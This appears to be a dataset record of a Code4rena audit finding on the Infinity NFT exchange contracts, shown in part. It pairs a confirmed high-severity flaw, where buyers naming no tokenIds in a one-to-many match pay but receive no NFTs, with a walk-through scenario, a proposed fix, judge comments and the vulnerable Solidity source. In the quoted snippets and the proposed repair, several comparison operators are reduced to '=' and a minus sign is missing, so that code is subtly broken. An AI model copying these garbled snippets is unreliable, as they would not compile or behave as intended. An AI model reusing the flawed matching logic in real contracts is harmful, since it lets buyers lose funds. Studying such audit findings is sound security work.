tokenIds.\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116\n\nsolidity\nfunction canExecMatchOneToMany(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.MakerOrder[] calldata manyMakerOrders\n  ) external view override returns (bool) {\n    uint256 numItems;\n    bool isOrdersTimeValid = true;\n    bool itemsIntersect = true;\n    uint256 ordersLength = manyMakerOrders.length;\n    for (uint256 i = 0; i < ordersLength; ) {\n      if (!isOrdersTimeValid || !itemsIntersect) {\n        return false; // short circuit\n      }\n\n      uint256 nftsLength = manyMakerOrders[i].nfts.length;\n      for (uint256 j = 0; j < nftsLength; ) {\n        numItems += manyMakerOrders[i].nfts[j].tokens.length;\n        unchecked {\n          ++j;\n        }\n      }\n\n      isOrdersTimeValid =\n        isOrdersTimeValid &&\n        manyMakerOrders[i].constraints[3] <= block.timestamp &&\n        manyMakerOrders[i].constraints[4] = block.timestamp;\n\n      itemsIntersect = itemsIntersect && doItemsIntersect(makerOrder.nfts, manyMakerOrders[i].nfts);\n\n      unchecked {\n        ++i;\n      }\n    }\n\n    bool _isTimeValid = isOrdersTimeValid &&\n      makerOrder.constraints[3] <= block.timestamp &&\n      makerOrder.constraints[4] = block.timestamp;\n\n    uint256 currentMakerOrderPrice = _getCurrentPrice(makerOrder);\n    uint256 sumCurrentOrderPrices = _sumCurrentPrices(manyMakerOrders);\n\n    bool _isPriceValid = false;\n    if (makerOrder.isSellOrder) {\n      _isPriceValid = sumCurrentOrderPrices = currentMakerOrderPrice;\n    } else {\n      _isPriceValid = sumCurrentOrderPrices <= currentMakerOrderPrice;\n    }\n\n    return (numItems == makerOrder.constraints[0]) && _isTimeValid && itemsIntersect && _isPriceValid;\n  }\n\n\nHowever, because buy.nfts is used as OrderItem to transfer the nfts from seller to buyer, and there are no tokenIds specified in the matched maker buy order, the buyer wont receive any nft (_transferERC721s does nothing, 0 transfers) despite the buyer paid full in price.\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L763-L786\n\nsolidity\nfunction _execMatchOneMakerSellToManyMakerBuys(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[buy.signer][buy.constraints[5]] = true;\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice protocolFee;\n    _execMatchOneToManyOrders(sell.signer, buy.signer, buy.nfts, buy.execParams[1], remainingAmount);\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1080-L1092\n\nsolidity\nfunction _transferERC721s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numTokens = item.tokens.length;\n    for (uint256 i = 0; i < numTokens; ) {\n      IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n\n\n1.  Alice signed and submitted a maker buy order #1, to buy 2 Punk with 2 WETH and specified tokenIds = 1,2\n2.  Bob signed and submitted a maker buy order #2, to buy 1 Punk with 1 WETH and with no specified tokenIds.\n3.  Charlie signed and submitted a maker sell order #3, ask for 3 WETH for 2 Punk and specified tokenIds = 1,2\n4.  The match executor called matchOneToManyOrders() match Charlie's sell order #3 with buy order #1 and #2, Alice received 2 Punk, Charlie received 3 WETH, Bob paid 1 WETH and get nothing in return.\n\n",
                "Repair": "\nChange to:\n\nsolidity\nfunction canExecMatchOneToMany(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.MakerOrder[] calldata manyMakerOrders\n  ) external view override returns (bool) {\n    uint256 numItems;\n    uint256 numConstructedItems;\n    bool isOrdersTimeValid = true;\n    bool itemsIntersect = true;\n    uint256 ordersLength = manyMakerOrders.length;\n    for (uint256 i = 0; i < ordersLength; ) {\n      if (!isOrdersTimeValid || !itemsIntersect) {\n        return false; // short circuit\n      }\n\n      numConstructedItems += manyMakerOrders[i].constraints[0];\n\n      uint256 nftsLength = manyMakerOrders[i].nfts.length;\n      for (uint256 j = 0; j < nftsLength; ) {\n        numItems += manyMakerOrders[i].nfts[j].tokens.length;\n        unchecked {\n          ++j;\n        }\n      }\n\n      isOrdersTimeValid =\n        isOrdersTimeValid &&\n        manyMakerOrders[i].constraints[3] <= block.timestamp &&\n        manyMakerOrders[i].constraints[4] = block.timestamp;\n\n      itemsIntersect = itemsIntersect && doItemsIntersect(makerOrder.nfts, manyMakerOrders[i].nfts);\n\n      unchecked {\n        ++i;\n      }\n    }\n\n    bool _isTimeValid = isOrdersTimeValid &&\n      makerOrder.constraints[3] <= block.timestamp &&\n      makerOrder.constraints[4] = block.timestamp;\n\n    uint256 currentMakerOrderPrice = _getCurrentPrice(makerOrder);\n    uint256 sumCurrentOrderPrices = _sumCurrentPrices(manyMakerOrders);\n\n    bool _isPriceValid = false;\n    if (makerOrder.isSellOrder) {\n      _isPriceValid = sumCurrentOrderPrices = currentMakerOrderPrice;\n    } else {\n      _isPriceValid = sumCurrentOrderPrices <= currentMakerOrderPrice;\n    }\n\n    return (numItems == makerOrder.constraints[0]) && (numConstructedItems == numItems) && _isTimeValid && itemsIntersect && _isPriceValid;\n  }\n\n\nnneverlander (Infinity) confirmed and resolved(https://github.com/code-423n4/2022-06-infinity-findings/issues/254#issuecomment-1162958056):\n Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/7f0e195d52165853281b971b8610b27140da6e41\n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-06-infinity-findings/issues/254#issuecomment-1179552380):\n  Confirmed the scenario as described.\n \n Buyers specifying just a collection and no specific tokens is a basically a floor sweep which has become common for NFTs. In this scenario, the warden shows how a buyer can end up spending money and get nothing in return. This is a High risk issue.\n \n Issue #314(https://github.com/code-423n4/2022-06-infinity-findings/issues/314) is very similar but flips the impact to explore how a seller's offer could be attacked and how it applies to an allow list of tokenIds. (It has been grouped with H-01)\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.14;\n\nimport {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';\n\nimport {OrderTypes} from '../libs/OrderTypes.sol';\nimport {IComplication} from '../interfaces/IComplication.sol';\n\n/**\n * @title InfinityOrderBookComplication\n * @author nneverlander. Twitter @nneverlander\n * @notice Complication to execute orderbook orders\n */\ncontract InfinityOrderBookComplication is IComplication, Ownable {\n  // ======================================================= EXTERNAL FUNCTIONS ==================================================\n\n  /**\n   * @notice Checks whether one to one matches can be executed\n   * @dev This function is called by the main exchange to check whether one to one matches can be executed.\n          It checks whether orders have the right constraints - i.e they have one NFT only, whether time is still valid,\n          prices are valid and whether the nfts intersect\n   * @param makerOrder1 first makerOrder\n   * @param makerOrder2 second makerOrder\n   * @return returns whether the order can be executed and the execution price\n   */\n  function canExecMatchOneToOne(OrderTypes.MakerOrder calldata makerOrder1, OrderTypes.MakerOrder calldata makerOrder2)\n    external\n    view\n    override\n    returns (bool, uint256)\n  {\n    bool numItemsValid = makerOrder2.constraints[0] == makerOrder1.constraints[0] &&\n      makerOrder2.constraints[0] == 1 &&\n      makerOrder2.nfts.length == 1 &&\n      makerOrder2.nfts[0].tokens.length == 1 &&\n      makerOrder1.nfts.length == 1 &&\n      makerOrder1.nfts[0].tokens.length == 1;\n    bool _isTimeValid = makerOrder2.constraints[3] <= block.timestamp &&\n      makerOrder2.constraints[4] >= block.timestamp &&\n      makerOrder1.constraints[3] <= block.timestamp &&\n      makerOrder1.constraints[4] >= block.timestamp;\n    bool _isPriceValid = false;\n    uint256 makerOrder1Price = _getCurrentPrice(makerOrder1);\n    uint256 makerOrder2Price = _getCurrentPrice(makerOrder2);\n    uint256 execPrice;\n    if (makerOrder1.isSellOrder) {\n      _isPriceValid = makerOrder2Price >= makerOrder1Price;\n      execPrice = makerOrder1Price;\n    } else {\n      _isPriceValid = makerOrder1Price >= makerOrder2Price;\n      execPrice = makerOrder2Price;\n    }\n    return (\n      numItemsValid && _isTimeValid && doItemsIntersect(makerOrder1.nfts, makerOrder2.nfts) && _isPriceValid,\n      execPrice\n    );\n  }\n\n  /**\n   * @notice Checks whether one to matches matches can be executed\n   * @dev This function is called by the main exchange to check whether one to many matches can be executed.\n          It checks whether orders have the right constraints - i.e they have the right number of items, whether time is still valid,\n          prices are valid and whether the nfts intersect\n   * @param makerOrder the one makerOrder\n   * @param manyMakerOrders many maker orders\n   * @return returns whether the order can be executed\n   */\n  function canExecMatchOneToMany(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.MakerOrder[] calldata manyMakerOrders\n  ) external view override returns (bool) {\n    uint256 numItems;\n    bool isOrdersTimeValid = true;\n    bool itemsIntersect = true;\n    uint256 ordersLength = manyMakerOrders.length;\n    for (uint256 i = 0; i < ordersLength; ) {\n      if (!isOrdersTimeValid || !itemsIntersect) {\n        return false; // short circuit\n      }\n\n      uint256 nftsLength = manyMakerOrders[i].nfts.length;\n      for (uint256 j = 0; j < nftsLength; ) {\n        numItems += manyMakerOrders[i].nfts[j].tokens.length;\n        unchecked {\n          ++j;\n        }\n      }\n\n      isOrdersTimeValid =\n        isOrdersTimeValid &&\n        manyMakerOrders[i].constraints[3] <= block.timestamp &&\n        manyMakerOrders[i].constraints[4] >= block.timestamp;\n\n      itemsIntersect = itemsIntersect && doItemsIntersect(makerOrder.nfts, manyMakerOrders[i].nfts);\n\n      unchecked {\n        ++i;\n      }\n    }\n\n    bool _isTimeValid = isOrdersTimeValid &&\n      makerOrder.constraints[3] <= block.timestamp &&\n      makerOrder.constraints[4] >= block.timestamp;\n\n    uint256 currentMakerOrderPrice = _getCurrentPrice(makerOrder);\n    uint256 sumCurrentOrderPrices = _sumCurrentPrices(manyMakerOrders);\n\n    bool _isPriceValid = false;\n    if (makerOrder.isSellOrder) {\n      _isPriceValid = sumCurrentOrderPrices >= currentMakerOrderPrice;\n    } else {\n      _isPriceValid = sumCurrentOrderPrices <= currentMakerOrderPrice;\n    }\n\n    return (numItems == makerOrder.constraints[0]) && _isTimeValid && itemsIntersect && _isPriceValid;\n  }\n\n  /**\n   * @notice Checks whether match orders with a higher order intent can be executed\n   * @dev This function is called by the main exchange to check whether one to one matches can be executed.\n          It checks whether orders have the right constraints - i.e they have the right number of items, whether time is still valid,\n          prices are valid and whether the nfts intersect\n   * @param sell sell order\n   * @param buy buy order\n   * @param constructedNfts - nfts constructed by the off chain matching engine\n   * @return returns whether the order can be executed and the execution price\n   */\n  function canExecMatchOrder(\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    OrderTypes.OrderItem[] calldata constructedNfts\n  ) external view override returns (bool, uint256) {\n    (bool _isPriceValid, uint256 execPrice) = isPriceValid(sell, buy);\n    return (\n      isTimeValid(sell, buy) &&\n        _isPriceValid &&\n        areNumItemsValid(sell, buy, constructedNfts) &&\n        doItemsIntersect(sell.nfts, constructedNfts) &&\n        doItemsIntersect(buy.nfts, constructedNfts) &&\n        doItemsIntersect(sell.nfts, buy.nfts),\n      execPrice\n    );\n  }\n\n  /**\n   * @notice Checks whether take orders with a higher order intent can be executed\n   * @dev This function is called by the main exchange to check whether take orders with a higher order intent can be executed.\n          It checks whether orders have the right constraints - i.e they have the right number of items, whether time is still valid\n          and whether the nfts intersect\n   * @param makerOrder the maker order\n   * @param takerItems the taker items specified by the taker\n   * @return returns whether order can be executed\n   */\n  function canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)\n    external\n    view\n    override\n    returns (bool)\n  {\n    return (makerOrder.constraints[3] <= block.timestamp &&\n      makerOrder.constraints[4] >= block.timestamp &&\n      areTakerNumItemsValid(makerOrder, takerItems) &&\n      doItemsIntersect(makerOrder.nfts, takerItems));\n  }\n\n  // ======================================================= PUBLIC FUNCTIONS ==================================================\n\n  /// @dev checks whether the orders are active and not expired\n  function isTimeValid(OrderTypes.MakerOrder calldata sell, OrderTypes.MakerOrder calldata buy)\n    public\n    view\n    returns (bool)\n  {\n    return\n      sell.constraints[3] <= block.timestamp &&\n      sell.constraints[4] >= block.timestamp &&\n      buy.constraints[3] <= block.timestamp &&\n      buy.constraints[4] >= block.timestamp;\n  }\n\n  /// @dev checks whether the price is valid; a buy order should always have a higher price than a sell order\n  function isPriceValid(OrderTypes.MakerOrder calldata sell, OrderTypes.MakerOrder calldata buy)\n    public\n    view\n    returns (bool, uint256)\n  {\n    (uint256 currentSellPrice, uint256 currentBuyPrice) = (_getCurrentPrice(sell), _getCurrentPrice(buy));\n    return (currentBuyPrice >= currentSellPrice, currentSellPrice);\n  }\n\n  /// @dev sanity check to make sure the constructed nfts conform to the user signed constraints\n  function areNumItemsValid(\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    OrderTypes.OrderItem[] calldata constructedNfts\n  ) public pure returns (bool) {\n    uint256 numConstructedItems = 0;\n    uint256 nftsLength = constructedNfts.length;\n    for (uint256 i = 0; i < nftsLength; ) {\n      unchecked {\n        numConstructedItems += constructedNfts[i].tokens.length;\n        ++i;\n      }\n    }\n    return numConstructedItems >= buy.constraints[0] && buy.constraints[0] <= sell.constraints[0];\n  }\n\n  /// @dev sanity check to make sure that a taker is specifying the right number of items\n  function areTakerNumItemsValid(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)\n    public\n    pure\n    returns (bool)\n  {\n    uint256 numTakerItems = 0;\n    uint256 nftsLength = takerItems.length;\n    for (uint256 i = 0; i < nftsLength; ) {\n      unchecked {\n        numTakerItems += takerItems[i].tokens.length;\n        ++i;\n      }\n    }\n    return makerOrder.constraints[0] == numTakerItems;\n  }\n\n  /**\n   * @notice Checks whether nfts intersect\n   * @dev This function checks whether there are intersecting nfts between two orders\n   * @param order1Nfts nfts in the first order\n   * @param order2Nfts nfts in the second order\n   * @return returns whether items intersect\n   */\n  function doItemsIntersect(OrderTypes.OrderItem[] calldata order1Nfts, OrderTypes.OrderItem[] calldata order2Nfts)\n    public\n    pure\n    returns (bool)\n  {\n    uint256 order1NftsLength = order1Nfts.length;\n    uint256 order2NftsLength = order2Nfts.length;\n    // case where maker/taker didn't specify any items\n    if (order1NftsLength == 0 || order2NftsLength == 0) {\n      return true;\n    }\n\n    uint256 numCollsMatched = 0;\n    // check if taker has all items in maker\n    for (uint256 i = 0; i < order2NftsLength; ) {\n      for (uint256 j = 0; j < order1NftsLength; ) {\n        if (order1Nfts[j].collection == order2Nfts[i].collection) {\n          // increment numCollsMatched\n          unchecked {\n            ++numCollsMatched;\n          }\n          // check if tokenIds intersect\n          bool tokenIdsIntersect = doTokenIdsIntersect(order1Nfts[j], order2Nfts[i]);\n          require(tokenIdsIntersect, 'tokenIds dont intersect');\n          // short circuit\n          break;\n        }\n        unchecked {\n          ++j;\n        }\n      }\n      unchecked {\n        ++i;\n      }\n    }\n\n    return numCollsMatched == order2NftsLength;\n  }\n\n  /**\n   * @notice Checks whether tokenIds intersect\n   * @dev This function checks whether there are intersecting tokenIds between two order items\n   * @param item1 first item\n   * @param item2 second item\n   * @return returns whether tokenIds intersect\n   */\n  function doTokenIdsIntersect(OrderTypes.OrderItem calldata item1, OrderTypes.OrderItem calldata item2)\n    public\n    pure\n    returns (bool)\n  {\n    uint256 item1TokensLength = item1.tokens.length;\n    uint256 item2TokensLength = item2.tokens.length;\n    // case where maker/taker didn't specify any tokenIds for this collection\n    if (item1TokensLength == 0 || item2TokensLength == 0) {\n      return true;\n    }\n    uint256 numTokenIdsPerCollMatched = 0;\n    for (uint256 k = 0; k < item2TokensLength; ) {\n      for (uint256 l = 0; l < item1TokensLength; ) {\n        if (\n          item1.tokens[l].tokenId == item2.tokens[k].tokenId && item1.tokens[l].numTokens == item2.tokens[k].numTokens\n        ) {\n          // increment numTokenIdsPerCollMatched\n          unchecked {\n            ++numTokenIdsPerCollMatched;\n          }\n          // short circuit\n          break;\n        }\n        unchecked {\n          ++l;\n        }\n      }\n      unchecked {\n        ++k;\n      }\n    }\n\n    return numTokenIdsPerCollMatched == item2TokensLength;\n  }\n\n  // ======================================================= UTILS ============================================================\n\n  /// @dev returns the sum of current order prices; used in match one to many orders\n  function _sumCurrentPrices(OrderTypes.MakerOrder[] calldata orders) internal view returns (uint256) {\n    uint256 sum = 0;\n    uint256 ordersLength = orders.length;\n    for (uint256 i = 0; i < ordersLength; ) {\n      sum += _getCurrentPrice(orders[i]);\n      unchecked {\n        ++i;\n      }\n    }\n    return sum;\n  }\n\n  /// @dev Gets current order price for orders that vary in price over time (dutch and reverse dutch auctions)\n  function _getCurrentPrice(OrderTypes.MakerOrder calldata order) internal view returns (uint256) {\n    (uint256 startPrice, uint256 endPrice) = (order.constraints[1], order.constraints[2]);\n    uint256 duration = order.constraints[4] - order.constraints[3];\n    uint256 priceDiff = startPrice > endPrice ? startPrice - endPrice : endPrice - startPrice;\n    if (priceDiff == 0 || duration == 0) {\n      return startPrice;\n    }\n    uint256 elapsedTime = block.timestamp - order.constraints[3];\n    uint256 PRECISION = 10**4; // precision for division; similar to bps\n    uint256 portionBps = elapsedTime > duration ? PRECISION : ((elapsedTime * PRECISION) / duration);\n    priceDiff = (priceDiff * portionBps) / PRECISION;\n    return startPrice > endPrice ? startPrice - priceDiff : startPrice + priceDiff;\n  }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.14;\n\n// external imports\nimport {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';\nimport {ReentrancyGuard} from '@openzeppelin/contracts/security/ReentrancyGuard.sol';\nimport {IERC165} from '@openzeppelin/contracts/interfaces/IERC165.sol';\nimport {IERC721} from '@openzeppelin/contracts/token/ERC721/IERC721.sol';\nimport {IERC1155} from '@openzeppelin/contracts/token/ERC1155/IERC1155.sol';\nimport {IERC20, SafeERC20} from '@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol';\nimport {EnumerableSet} from '@openzeppelin/contracts/utils/structs/EnumerableSet.sol';\n\n// internal imports\nimport {OrderTypes} from '../libs/OrderTypes.sol';\nimport {IComplication} from '../interfaces/IComplication.sol';\nimport {SignatureChecker} from '../libs/SignatureChecker.sol';\n\n/**\n@title InfinityExchange\n@author nneverlander. Twitter @nneverlander\n@notice The main NFT exchange contract that holds state and does asset transfers\n@dev This contract can be extended via 'complications' - strategies that let the exchange execute various types of orders\n      like dutch auctions, reverse dutch auctions, floor price orders, private sales, etc.\n\nNFTNFTNFT...........................................NFTNFTNFT\nNFTNFT                                                 NFTNFT\nNFT                                                       NFT\n.                                                           .\n.                                                           .\n.                                                           .\n.                                                           .\n.               NFTNFTNFT            NFTNFTNFT              .\n.            NFTNFTNFTNFTNFT      NFTNFTNFTNFTNFT           .\n.           NFTNFTNFTNFTNFTNFT   NFTNFTNFTNFTNFTNFT         .\n.         NFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFT        .\n.         NFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFT        .\n.         NFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFT        .\n.          NFTNFTNFTNFTNFTNFTN   NFTNFTNFTNFTNFTNFT         .\n.            NFTNFTNFTNFTNFT      NFTNFTNFTNFTNFT           .\n.               NFTNFTNFT            NFTNFTNFT              .\n.                                                           .\n.                                                           .\n.                                                           .\n.                                                           .\nNFT                                                       NFT\nNFTNFT                                                 NFTNFT\nNFTNFTNFT...........................................NFTNFTNFT \n\n*/\ncontract InfinityExchange is ReentrancyGuard, Ownable {\n  using SafeERC20 for IERC20;\n  using EnumerableSet for EnumerableSet.AddressSet;\n\n  /// @dev WETH address of a chain; set at deploy time to the WETH address of the chain that this contract is deployed to\n  address public immutable WETH;\n  /// @dev Used in order signing with EIP-712\n  bytes32 public immutable DOMAIN_SEPARATOR;\n  /// @dev This is the adress that is used to send auto sniped orders for execution on chain\n  address public MATCH_EXECUTOR;\n  /// @dev Gas cost for auto sniped orders are paid by the buyers and refunded to this contract in the form of WETH\n  uint32 public WETH_TRANSFER_GAS_UNITS = 50000;\n  /// @notice Exchange fee in basis points (250 bps = 2.5%)\n  uint16 public PROTOCOL_FEE_BPS = 250;\n\n  /**\n   @dev All orders should have a nonce >= to this value. \n        Any orders with nonce value less than this are non-executable. \n        Used for cancelling all outstanding orders.\n  */\n  mapping(address => uint256) public userMinOrderNonce;\n\n  /// @dev This records already executed or cancelled orders to prevent replay attacks.\n  mapping(address => mapping(uint256 => bool)) public isUserOrderNonceExecutedOrCancelled;\n\n  /// @dev Storage variable that keeps track of valid complications (order execution strategies)\n  EnumerableSet.AddressSet private _complications;\n  /// @dev Storate variable that keeps track of valid currencies (tokens)\n  EnumerableSet.AddressSet private _currencies;\n\n  event CancelAllOrders(address user, uint256 newMinNonce);\n  event CancelMultipleOrders(address user, uint256[] orderNonces);\n  event NewWethTransferGasUnits(uint32 wethTransferGasUnits);\n  event NewProtocolFee(uint16 protocolFee);\n\n  event MatchOrderFulfilled(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    address seller,\n    address buyer,\n    address complication, // address of the complication that defines the execution\n    address currency, // token address of the transacting currency\n    uint256 amount // amount spent on the order\n  );\n\n  event TakeOrderFulfilled(\n    bytes32 orderHash,\n    address seller,\n    address buyer,\n    address complication, // address of the complication that defines the execution\n    address currency, // token address of the transacting currency\n    uint256 amount // amount spent on the order\n  );\n\n  constructor(address _WETH, address _matchExecutor) {\n    // Calculate the domain separator\n    DOMAIN_SEPARATOR = keccak256(\n      abi.encode(\n        keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),\n        keccak256('InfinityExchange'),\n        keccak256(bytes('1')), // for versionId = 1\n        block.chainid,\n        address(this)\n      )\n    );\n    WETH = _WETH;\n    MATCH_EXECUTOR = _matchExecutor;\n  }\n\n  fallback() external payable {}\n\n  receive() external payable {}\n\n  // =================================================== USER FUNCTIONS =======================================================\n\n  /**\n   @notice Matches orders one to one where each order has 1 NFT. Example: Match 1 specific NFT buy with one specific NFT sell.\n   @dev Can execute orders in batches for gas efficiency. Can only be called by the match executor. Refunds gas cost incurred by the\n        match executor to this contract. Checks whether the given complication can execute the match.\n   @param makerOrders1 Maker order 1\n   @param makerOrders2 Maker order 2\n  */\n  function matchOneToOneOrders(\n    OrderTypes.MakerOrder[] calldata makerOrders1,\n    OrderTypes.MakerOrder[] calldata makerOrders2\n  ) external {\n    uint256 startGas = gasleft();\n    uint256 numMakerOrders = makerOrders1.length;\n    require(msg.sender == MATCH_EXECUTOR, 'OME');\n    require(numMakerOrders == makerOrders2.length, 'mismatched lengths');\n\n    // the below 3 variables are copied to memory once to save on gas\n    // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas\n    // since these values won't change during function execution, we can save on gas by copying them to memory once\n    // instead of SLOADing once for each loop iteration\n    uint16 protocolFeeBps = PROTOCOL_FEE_BPS;\n    uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;\n    address weth = WETH;\n    for (uint256 i = 0; i < numMakerOrders; ) {\n      uint256 startGasPerOrder = gasleft() + ((startGas - gasleft()) / numMakerOrders);\n      require(_complications.contains(makerOrders1[i].execParams[0]), 'invalid complication');\n      (bool canExec, uint256 execPrice) = IComplication(makerOrders1[i].execParams[0]).canExecMatchOneToOne(\n        makerOrders1[i],\n        makerOrders2[i]\n      );\n      require(canExec, 'cannot execute');\n      _matchOneToOneOrders(\n        makerOrders1[i],\n        makerOrders2[i],\n        startGasPerOrder,\n        execPrice,\n        protocolFeeBps,\n        wethTransferGasUnits,\n        weth\n      );\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  /**\n   @notice Matches one  order to many orders. Example: A buy order with 5 specific NFTs with 5 sell orders with those specific NFTs.\n   @dev Can only be called by the match executor. Refunds gas cost incurred by the\n        match executor to this contract. Checks whether the given complication can execute the match.\n   @param makerOrder The one order to match\n   @param manyMakerOrders Array of multiple orders to match the one order against\n  */\n  function matchOneToManyOrders(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.MakerOrder[] calldata manyMakerOrders\n  ) external {\n    uint256 startGas = gasleft();\n    require(msg.sender == MATCH_EXECUTOR, 'OME');\n    require(_complications.contains(makerOrder.execParams[0]), 'invalid complication');\n    require(\n      IComplication(makerOrder.execParams[0]).canExecMatchOneToMany(makerOrder, manyMakerOrders),\n      'cannot execute'\n    );\n    bytes32 makerOrderHash = _hash(makerOrder);\n    require(isOrderValid(makerOrder, makerOrderHash), 'invalid maker order');\n    uint256 ordersLength = manyMakerOrders.length;\n    // the below 3 variables are copied to memory once to save on gas\n    // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas\n    // since these values won't change during function execution, we can save on gas by copying them to memory once\n    // instead of SLOADing once for each loop iteration\n    uint16 protocolFeeBps = PROTOCOL_FEE_BPS;\n    uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;\n    address weth = WETH;\n    if (makerOrder.isSellOrder) {\n      for (uint256 i = 0; i < ordersLength; ) {\n        // 20000 for the SSTORE op that updates maker nonce status from zero to a non zero status\n        uint256 startGasPerOrder = gasleft() + ((startGas + 20000 - gasleft()) / ordersLength);\n        _matchOneMakerSellToManyMakerBuys(\n          makerOrderHash,\n          makerOrder,\n          manyMakerOrders[i],\n          startGasPerOrder,\n          protocolFeeBps,\n          wethTransferGasUnits,\n          weth\n        );\n        unchecked {\n          ++i;\n        }\n      }\n      isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n    } else {\n      uint256 protocolFee;\n      for (uint256 i = 0; i < ordersLength; ) {\n        protocolFee += _matchOneMakerBuyToManyMakerSells(\n          makerOrderHash,\n          manyMakerOrders[i],\n          makerOrder,\n          protocolFeeBps\n        );\n        unchecked {\n          ++i;\n        }\n      }\n      isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n      uint256 gasCost = (startGas - gasleft() + WETH_TRANSFER_GAS_UNITS) * tx.gasprice;\n      // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n      // else we need to send the protocol fee separately in the execution currency\n      // since the buyer is common across many sell orders, this part can be executed outside the above for loop\n      // in contrast to the case where if the one order is a sell order, we need to do this in each for loop\n      if (makerOrder.execParams[1] == weth) {\n        IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), protocolFee + gasCost);\n      } else {\n        IERC20(makerOrder.execParams[1]).safeTransferFrom(makerOrder.signer, address(this), protocolFee);\n        IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), gasCost);\n      }\n    }\n  }\n\n  /**\n   @notice Matches orders one to one where no specific NFTs are specified. \n          Example: A collection wide buy order with any 2 NFTs with a sell order that has any 2 NFTs from that collection.\n   @dev Can only be called by the match executor. Refunds gas cost incurred by the\n        match executor to this contract. Checks whether the given complication can execute the match.\n        The constructs param specifies the actual NFTs that will be executed since buys and sells need not specify actual NFTs - only \n        a higher level intent.\n   @param sells User signed sell orders\n   @param buys User signed buy orders\n   @param constructs Intersection of the NFTs in the sells and buys. Constructed by an off chain matching engine.\n  */\n  function matchOrders(\n    OrderTypes.MakerOrder[] calldata sells,\n    OrderTypes.MakerOrder[] calldata buys,\n    OrderTypes.OrderItem[][] calldata constructs\n  ) external {\n    uint256 startGas = gasleft();\n    uint256 numSells = sells.length;\n    require(msg.sender == MATCH_EXECUTOR, 'OME');\n    require(numSells == buys.length && numSells == constructs.length, 'mismatched lengths');\n    // the below 3 variables are copied to memory once to save on gas\n    // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas\n    // since these values won't change during function execution, we can save on gas by copying them to memory once\n    // instead of SLOADing once for each loop iteration\n    uint16 protocolFeeBps = PROTOCOL_FEE_BPS;\n    uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;\n    address weth = WETH;\n    for (uint256 i = 0; i < numSells; ) {\n      uint256 startGasPerOrder = gasleft() + ((startGas - gasleft()) / numSells);\n      (bool executionValid, uint256 execPrice) = IComplication(sells[i].execParams[0]).canExecMatchOrder(\n        sells[i],\n        buys[i],\n        constructs[i]\n      );\n      require(executionValid, 'cannot execute');\n      _matchOrders(\n        sells[i],\n        buys[i],\n        constructs[i],\n        startGasPerOrder,\n        execPrice,\n        protocolFeeBps,\n        wethTransferGasUnits,\n        weth\n      );\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  /**\n   @notice Batch buys or sells orders with specific `1` NFTs. Transaction initiated by an end user.\n   @param makerOrders The orders to fulfill\n  */\n  function takeMultipleOneOrders(OrderTypes.MakerOrder[] calldata makerOrders) external payable nonReentrant {\n    uint256 numMakerOrders = makerOrders.length;\n    uint256 totalPrice;\n    address currency = makerOrders[0].execParams[1];\n    bool isMakerSeller = makerOrders[0].isSellOrder;\n    if (!isMakerSeller) {\n      require(currency != address(0), 'offers only in ERC20');\n    }\n    for (uint256 i = 0; i < numMakerOrders; ) {\n      bytes32 makerOrderHash = _hash(makerOrders[i]);\n      require(isOrderValid(makerOrders[i], 